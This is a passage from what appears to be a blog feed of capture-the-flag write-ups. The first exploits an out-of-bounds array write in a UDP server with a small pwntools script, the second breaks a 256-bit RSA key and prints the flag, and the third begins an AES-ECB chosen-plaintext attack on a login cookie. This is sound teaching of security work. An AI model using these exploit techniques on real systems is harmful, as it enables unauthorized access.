  &lt;li&gt;A 16-bit integer for the type of the command.  Not used within the program.&lt;/li&gt;
  &lt;li&gt;A 32-bit integer for the ID of the command. This is the only value used by the program. Valid IDs are defined within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_id_type&lt;/code&gt; enum.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Looking through the possible IDs, the most interesting one is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COMMAND_GETKEYS&lt;/code&gt; with an ID of 9. This command is what will order the server to print out the flag. However, the server has locked down this functionality on startup using a variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; initialized to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOCKED&lt;/code&gt; - a value of 1. Until we can set this variable to 0, the server will refuse to print out the flag.&lt;/p&gt;

&lt;p&gt;After analyzing the source code for this server, we discover the vulnerable portion of this code on line 134, which is:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;// Log the message in the command log&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;command_log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under normal operations, this array is simply used to track how many times a certain command ID has been received. For instance, to see how many times &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COMMAND_GETKEYS&lt;/code&gt; has been issued, we would access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_log[9]&lt;/code&gt;. What makes this exploitable is that &lt;strong&gt;C&lt;/strong&gt; and &lt;strong&gt;C++&lt;/strong&gt; do not perform bounds-checking by default when accessing an array. In addition, we have full control over what ID is sent to this line of code. So by providing a value outside the bounds of this array, such as negative values, we can modify any memory throughout the program.&lt;/p&gt;

&lt;p&gt;Our goal is to determine how many bytes before or after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_log&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; located. By knowing this, we will be able to determine the correct ID to use in order to modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; value. To assist in our analysis, we can compile the provided source code using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;g++&lt;/code&gt; and debug it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;. But before doing this, we uncomment lines 157 and 158 to display the memory addresses for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_log&lt;/code&gt; when we run the program.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;$ g++ parser.c

$ ./a.out
Address of lock_state:       0x56070625c130
Address of command_log: 0x56070625c138
Trying to bind to socket.
Bound to socket.
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at this, we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; is only 8 bytes behind &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_log&lt;/code&gt;. So by sending an ID value of -8, we will be able to increment the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; variable by 1 on every command. The issue right now is that we can only &lt;em&gt;increase&lt;/em&gt; the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt;. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; starts at 1, we will need to &lt;em&gt;overflow&lt;/em&gt; this byte in order to reach our desired value of 0. Thankfully, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_log&lt;/code&gt; is defined as an array of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char&lt;/code&gt; values, so its max value is only 255.&lt;/p&gt;

&lt;p&gt;One thing to note is that until now, we’ve only been directly typing input for the server into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; session. However, since the server only looks at the underlying bytes it receives, it’ll interpret our “-8” as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x382d0000&lt;/code&gt;. So to send a properly formatted payload, we will need to create a simple Python script to construct our message at the byte-level and send it to the server. This is a very simple task using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54321&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'udp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'signed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using this script, we can validate the exploitation method by examining the server’s memory with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb&lt;/code&gt;. In the following demo, we send the malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;command_header&lt;/code&gt; a few times to demonstrate how we’re able to increment the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_state&lt;/code&gt; variable.&lt;/p&gt;

&lt;script id=&quot;asciicast-cnSjOv7IP0MIXkBp7hoyh11VU&quot; src=&quot;https://asciinema.org/a/cnSjOv7IP0MIXkBp7hoyh11VU.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;p&gt;The next demo shows how the value overflows after 255 commands.&lt;/p&gt;

&lt;script id=&quot;asciicast-2AfnwYOQjo8awlTQpwTXMaTRn&quot; src=&quot;https://asciinema.org/a/2AfnwYOQjo8awlTQpwTXMaTRn.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;

&lt;p&gt;Finally, we can send our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GETKEYS&lt;/code&gt; command and retrieve the flag from the server. The following demo shows us running the final exploit script (&lt;a href=&quot;https://bernardsmith0892.github.io/assets/files/forest.py&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forest.py&lt;/code&gt;&lt;/a&gt;):&lt;/p&gt;

&lt;script id=&quot;asciicast-3NviNO3HUdzmcZoNWw4MhhO8w&quot; src=&quot;https://asciinema.org/a/3NviNO3HUdzmcZoNWw4MhhO8w.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;</content><author><name></name></author><category term="CTF" /><category term="HackASat2" /><category term="reverse_engineering" /><summary type="html">tree in the forest (Rapid Unplanned Disassembly) Upon connecting to the challenge and providing our ticket, we’re presented with a simple message. 1 Starting up Service on udp:18.222.149.188:12752 We can connect to this server using nc -u 18.222.149.188 12752 and see what the challenge looks like. After experimenting with a bit of random input, we can quickly see that the server is expecting 8 bytes of input. 1 2 3 4 5 6 7 8 9 $ nc -u 18.222.149.188 12752 555555 Invalid length of command header, expected 8 but got 7 5555555 Command header acknowledge: version:13621 type:13621 id:171259189 Invalid id:171259189 55555555 Command header acknowledge: version:13621 type:13621 id:892679477 Invalid id:892679477 The challenge page provides us with the source code (parser.c) for this server, which easily illuminates what’s going on. The server is expecting us to provide a command_header struct composed of three values: A 16-bit integer for the version of the command. Not used within the program. A 16-bit integer for the type of the command. Not used within the program. A 32-bit integer for the ID of the command. This is the only value used by the program. Valid IDs are defined within the command_id_type enum. Looking through the possible IDs, the most interesting one is COMMAND_GETKEYS with an ID of 9. This command is what will order the server to print out the flag. However, the server has locked down this functionality on startup using a variable lock_state initialized to LOCKED - a value of 1. Until we can set this variable to 0, the server will refuse to print out the flag. After analyzing the source code for this server, we discover the vulnerable portion of this code on line 134, which is: 1 2 // Log the message in the command log command_log[header-&amp;gt;id]++; Under normal operations, this array is simply used to track how many times a certain command ID has been received. For instance, to see how many times COMMAND_GETKEYS has been issued, we would access command_log[9]. What makes this exploitable is that C and C++ do not perform bounds-checking by default when accessing an array. In addition, we have full control over what ID is sent to this line of code. So by providing a value outside the bounds of this array, such as negative values, we can modify any memory throughout the program. Our goal is to determine how many bytes before or after command_log is lock_state located. By knowing this, we will be able to determine the correct ID to use in order to modify the lock_state value. To assist in our analysis, we can compile the provided source code using g++ and debug it using gdb. But before doing this, we uncomment lines 157 and 158 to display the memory addresses for lock_state and command_log when we run the program. 1 2 3 4 5 6 7 $ g++ parser.c $ ./a.out Address of lock_state: 0x56070625c130 Address of command_log: 0x56070625c138 Trying to bind to socket. Bound to socket. Looking at this, we can see that lock_state is only 8 bytes behind command_log. So by sending an ID value of -8, we will be able to increment the lock_state variable by 1 on every command. The issue right now is that we can only increase the value of lock_state. Since lock_state starts at 1, we will need to overflow this byte in order to reach our desired value of 0. Thankfully, command_log is defined as an array of char values, so its max value is only 255. One thing to note is that until now, we’ve only been directly typing input for the server into a nc session. However, since the server only looks at the underlying bytes it receives, it’ll interpret our “-8” as 0x382d0000. So to send a properly formatted payload, we will need to create a simple Python script to construct our message at the byte-level and send it to the server. This is a very simple task using pwntools. 1 2 3 4 5 6 from pwn import * io = remote('0.0.0.0', 54321, typ='udp') io.send( p16(1) + p16(1) + p32(-8, sign='signed') ) print(io.recvline()) print(io.recvline()) Using this script, we can validate the exploitation method by examining the server’s memory with gdb. In the following demo, we send the malicious command_header a few times to demonstrate how we’re able to increment the lock_state variable. The next demo shows how the value overflows after 255 commands. Finally, we can send our GETKEYS command and retrieve the flag from the server. The following demo shows us running the final exploit script (forest.py):</summary></entry><entry><title type="html">All-Army CyberStakes 4 - Cryptography (Headpiece Silver)</title><link href="https://bernardsmith0892.github.io/posts/acictf4-headpiece-silver/" rel="alternate" type="text/html" title="All-Army CyberStakes 4 - Cryptography (Headpiece Silver)" /><published>2020-05-16T04:00:00-10:00</published><updated>2020-05-16T04:00:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/acictf4-headpiece-silver</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/acictf4-headpiece-silver/">&lt;h1 id=&quot;headpiece-silver-250-points&quot;&gt;Headpiece Silver (250 Points)&lt;/h1&gt;

&lt;p&gt;This challenge provides us with a server to interact with at challenge.acictf.com:30151. (&lt;em&gt;Your port number may differ&lt;/em&gt;) To get started, lets see what this server is about by connecting to it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ncat&lt;/code&gt;.&lt;/p&gt;

&lt;script id=&quot;asciicast-sNd3fjZW4f9c69nYw88Ieu4G8&quot; src=&quot;https://asciinema.org/a/sNd3fjZW4f9c69nYw88Ieu4G8.js&quot; async=&quot;&quot; data-rows=&quot;20&quot;&gt;&lt;/script&gt;

&lt;p&gt;Based on this information given to us, this is clearly another &lt;em&gt;RSA&lt;/em&gt; related challenge. The server provides us with the components for a &lt;em&gt;public key&lt;/em&gt;, the public modulus &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, and the public exponent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt;, which are:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;N: 122298190177919866881639090045815514691491489519639425496178483984084352945237
e: 65537
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we can derive the &lt;em&gt;private key&lt;/em&gt; from this &lt;em&gt;public key&lt;/em&gt;, we will be able to decrypt the encrypted password they provided to us, which is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;985be9b7b845a1a09a916437d767c30ae8d7ad4987cb77b0602b04889f7c2301&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Normally, computing the &lt;em&gt;private key&lt;/em&gt; from just the &lt;em&gt;public key&lt;/em&gt; is nearly impossible. However, what makes the key provided here different is in the &lt;em&gt;key length&lt;/em&gt;. Most RSA keys are used today are &lt;strong&gt;2048-bit&lt;/strong&gt; keys, which are practically impossible for current computers to decrypt. But the key provided by the server is only around a &lt;strong&gt;256-bit&lt;/strong&gt; key, which is vastly weaker than what is needed for proper security. To fully compare the strengths of these two key lengths, we need to determine how many &lt;em&gt;bits of security&lt;/em&gt; these keys would have. Since RSA is based on the &lt;em&gt;factoring problem&lt;/em&gt;, brute-forcing an RSA key doesn’t require you to test &lt;strong&gt;all&lt;/strong&gt; possible numbers, unlike &lt;a href=&quot;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&quot;&gt;AES&lt;/a&gt; where you’d need to check every possible key. So while &lt;em&gt;AES-256&lt;/em&gt; has &lt;em&gt;256-bit security&lt;/em&gt;, 2048-bit RSA key doesn’t have 2048-bit security.&lt;/p&gt;

&lt;p&gt;According to &lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf&quot;&gt;NIST (p. 54)&lt;/a&gt;, a 2048-bit RSA key only offers about &lt;strong&gt;112-bit security&lt;/strong&gt;. And while 256-bit RSA is so weak that it isn’t even considered in the NIST publication, &lt;a href=&quot;https://crypto.stackexchange.com/questions/8687/security-strength-of-rsa-in-relation-with-the-modulus-size&quot;&gt;this StackExchange&lt;/a&gt; question tells us that &lt;a href=&quot;https://www.wolframalpha.com/input/?i=N%5BLog2%5BExp%5B%2864%2F9*Log%5B2%5E256%5D%29%5E%281%2F3%29*%28Log%5BLog%5B2%5E256%5D%5D%29%5E%282%2F3%29%5D%5D%5D&quot;&gt;256-bit RSA&lt;/a&gt; only offers around &lt;strong&gt;46-bit security&lt;/strong&gt;. Each extra bit of security makes a key twice as secure, so 256-bit RSA is &lt;em&gt;twice&lt;/em&gt; as easy to break than a key with &lt;em&gt;47-bit security&lt;/em&gt;. Now compared to 2048-bit RSA, 256-bit RSA is about &lt;em&gt;73 quintillion&lt;/em&gt; times easier to break, or &lt;em&gt;73,786,976,294,838,206,464&lt;/em&gt; times easier.&lt;/p&gt;

&lt;p&gt;Now to how we can actually break the key. &lt;a href=&quot;https://github.com/Ganapati/RsaCtfTool&quot;&gt;RsaCtfTool&lt;/a&gt; makes this task very easy. We can provide the &lt;em&gt;public key&lt;/em&gt; components, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt;, and the &lt;em&gt;ciphertext&lt;/em&gt; in decimal to this tool in order to quickly derive the &lt;em&gt;private key&lt;/em&gt; and &lt;em&gt;plaintext&lt;/em&gt;. (&lt;em&gt;Note: It appears the challenge’s modulus is now in &lt;a href=&quot;http://factordb.com/index.php?query=122298190177919866881639090045815514691491489519639425496178483984084352945237&quot;&gt;FactorDB&lt;/a&gt;, so RsaCtfTool isn’t conducting the full attack)&lt;/em&gt;.&lt;/p&gt;

&lt;script id=&quot;asciicast-rfequzN91lhn6WrsCDyYnTD34&quot; src=&quot;https://asciinema.org/a/rfequzN91lhn6WrsCDyYnTD34.js&quot; async=&quot;&quot; data-rows=&quot;20&quot;&gt;&lt;/script&gt;

&lt;p&gt;We can see the plaintext password at the end of the unciphered data: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4n1a5ebRFmtyysAe&lt;/code&gt;. By providing this password to the server, we can retrieve the flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACI{ad94502b4d2437193e9c3fed364}&lt;/code&gt;&lt;/p&gt;

&lt;script id=&quot;asciicast-jeYy2ox48alc3qVHwKL5BTufE&quot; src=&quot;https://asciinema.org/a/jeYy2ox48alc3qVHwKL5BTufE.js&quot; async=&quot;&quot; data-rows=&quot;20&quot;&gt;&lt;/script&gt;

&lt;h2 id=&quot;bonus-solution&quot;&gt;Bonus Solution&lt;/h2&gt;

&lt;p&gt;As it turns out, like many real-world systems, the challenge’s server has a &lt;em&gt;misconfiguration&lt;/em&gt; vulnerability that allows you to skip all of this. What we didn’t check in the previous steps was the fourth option to &lt;em&gt;test ciphertext&lt;/em&gt;. It appears that this was supposed to serve as a &lt;em&gt;decryption oracle&lt;/em&gt; that decrypts whatever you provide it using the server’s private key. However, since the &lt;em&gt;password ciphertext&lt;/em&gt; is encrypted with the public key, we are able to use this test function to simply have the server decrypt the password ciphertext itself.&lt;/p&gt;

&lt;script id=&quot;asciicast-2h6fYvAV9BvBDJYhw3PqUrtN2&quot; src=&quot;https://asciinema.org/a/2h6fYvAV9BvBDJYhw3PqUrtN2.js&quot; async=&quot;&quot; data-rows=&quot;20&quot;&gt;&lt;/script&gt;</content><author><name></name></author><category term="CTF" /><category term="AllArmyCyberStakes4" /><category term="cryptography" /><summary type="html">Headpiece Silver (250 Points) This challenge provides us with a server to interact with at challenge.acictf.com:30151. (Your port number may differ) To get started, lets see what this server is about by connecting to it using ncat. Based on this information given to us, this is clearly another RSA related challenge. The server provides us with the components for a public key, the public modulus N, and the public exponent e, which are: 1 2 N: 122298190177919866881639090045815514691491489519639425496178483984084352945237 e: 65537 If we can derive the private key from this public key, we will be able to decrypt the encrypted password they provided to us, which is: 985be9b7b845a1a09a916437d767c30ae8d7ad4987cb77b0602b04889f7c2301 Normally, computing the private key from just the public key is nearly impossible. However, what makes the key provided here different is in the key length. Most RSA keys are used today are 2048-bit keys, which are practically impossible for current computers to decrypt. But the key provided by the server is only around a 256-bit key, which is vastly weaker than what is needed for proper security. To fully compare the strengths of these two key lengths, we need to determine how many bits of security these keys would have. Since RSA is based on the factoring problem, brute-forcing an RSA key doesn’t require you to test all possible numbers, unlike AES where you’d need to check every possible key. So while AES-256 has 256-bit security, 2048-bit RSA key doesn’t have 2048-bit security. According to NIST (p. 54), a 2048-bit RSA key only offers about 112-bit security. And while 256-bit RSA is so weak that it isn’t even considered in the NIST publication, this StackExchange question tells us that 256-bit RSA only offers around 46-bit security. Each extra bit of security makes a key twice as secure, so 256-bit RSA is twice as easy to break than a key with 47-bit security. Now compared to 2048-bit RSA, 256-bit RSA is about 73 quintillion times easier to break, or 73,786,976,294,838,206,464 times easier. Now to how we can actually break the key. RsaCtfTool makes this task very easy. We can provide the public key components, N and e, and the ciphertext in decimal to this tool in order to quickly derive the private key and plaintext. (Note: It appears the challenge’s modulus is now in FactorDB, so RsaCtfTool isn’t conducting the full attack). We can see the plaintext password at the end of the unciphered data: 4n1a5ebRFmtyysAe. By providing this password to the server, we can retrieve the flag: ACI{ad94502b4d2437193e9c3fed364} Bonus Solution As it turns out, like many real-world systems, the challenge’s server has a misconfiguration vulnerability that allows you to skip all of this. What we didn’t check in the previous steps was the fourth option to test ciphertext. It appears that this was supposed to serve as a decryption oracle that decrypts whatever you provide it using the server’s private key. However, since the password ciphertext is encrypted with the public key, we are able to use this test function to simply have the server decrypt the password ciphertext itself.</summary></entry><entry><title type="html">All-Army CyberStakes 4 - Cryptography (Speak Plainly)</title><link href="https://bernardsmith0892.github.io/posts/acictf4-speakplainly/" rel="alternate" type="text/html" title="All-Army CyberStakes 4 - Cryptography (Speak Plainly)" /><published>2020-05-16T03:00:00-10:00</published><updated>2020-05-16T03:00:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/acictf4-speakplainly</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/acictf4-speakplainly/">&lt;h1 id=&quot;speak-plainly-150-points&quot;&gt;Speak Plainly (150 Points)&lt;/h1&gt;

&lt;p&gt;This problem diverts from the previous ones by providing us with a website instead. The hints bring a lot of attention to the website’s login cookies, so we try creating an account and examining the created cookies. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_token&lt;/code&gt; in particular stands out since it’s not a standard cookie that’s seen on other sites.&lt;/p&gt;

&lt;figure&gt;
  &lt;img src=&quot;https://bernardsmith0892.github.io/assets/imgs/speakplainly/login.png&quot; alt=&quot;Logging In&quot; /&gt;
  &lt;figcaption&gt;Creating an account.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img src=&quot;https://bernardsmith0892.github.io/assets/imgs/speakplainly/cookies.png&quot; alt=&quot;Cookies&quot; /&gt;
  &lt;figcaption&gt;The list of site cookies from the Chrome DevTools menu.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;After creating an account, the website tells us it’ll give us the flag after we provide it with the &lt;em&gt;StrongToken&lt;/em&gt;. The home page has several information blocks that give us a few hints about what this could mean:&lt;/p&gt;

&lt;figure&gt;
  &lt;img src=&quot;https://bernardsmith0892.github.io/assets/imgs/speakplainly/encryption-info.png&quot; alt=&quot;Speak Plainly Hints&quot; /&gt;
  &lt;figcaption&gt;Information blocks from the website's main menu.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_token&lt;/code&gt; is encrypted with a 128-bit key in &lt;a href=&quot;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)&quot;&gt;AES-ECB&lt;/a&gt; mode.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Prior to encryption, the site appends a &lt;em&gt;StrongToken&lt;/em&gt; to the data and then encrypts it.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Since the site is using &lt;em&gt;Electronic Code Book (ECB) mode&lt;/em&gt;, we can perform a &lt;em&gt;chosen-plaintext attack&lt;/em&gt; by using the account creation process as an &lt;em&gt;encryption oracle&lt;/em&gt;. This will allows us to extract the &lt;em&gt;StrongToken&lt;/em&gt;, byte-by-byte. The entire attack process is well-explained in a blog post by &lt;a href=&quot;https://zachgrace.com/posts/attacking-ecb/&quot;&gt;Zach Grace&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Since we’re going to be using the account creation feature quite a bit, we should figure out a way to make the process easier for us. &lt;em&gt;Burp Suite&lt;/em&gt; has a feature called &lt;em&gt;Repeater&lt;/em&gt; that allows us to save a web request and repeatedly modify and resend it, rather than repeating the process in the web browser.&lt;/p&gt;

&lt;figure&gt;
  &lt;img src=&quot;https://bernardsmith0892.github.io/assets/imgs/speakplainly/burp-history.png&quot; alt=&quot;Burp Suite History&quot; /&gt;
  &lt;figcaption&gt;Finding the web request to repeat in the history menu.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img src=&quot;https://bernardsmith0892.github.io/assets/imgs/speakplainly/burp-choose-repeater.png&quot; alt=&quot;Burp Suite Repeater Option&quot; /&gt;
  &lt;figcaption&gt;Selecting the &lt;i&gt;Send to Repeater&lt;/i&gt; option.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img src=&quot;https://bernardsmith0892.github.io/assets/imgs/speakplainly/burp-repeater.png&quot; alt=&quot;Burp Suite Repeater&quot; /&gt;
  &lt;figcaption&gt;Modifying the request and seeing the &lt;code&gt;auth_token&lt;/code&gt; change in the response.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Our first step is to figure out exactly what’s being encrypted. We know it comes from the account information, so there’s only two real options: the username and password. By testing out two accounts with the same username but different passwords, we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_token&lt;/code&gt; doesn’t change as long as the username stays the same. With this, we can determine that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_token&lt;/code&gt; only uses the username in its encryption.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;testusername:password = 958af5df8adcc6bb0abf0473f6be9bb7684387617f292c4d7e1f689f7f5bf19d
testusername:newpass  = 958af5df8adcc6bb0abf0473f6be9bb7684387617f292c4d7e1f689f7f5bf19d
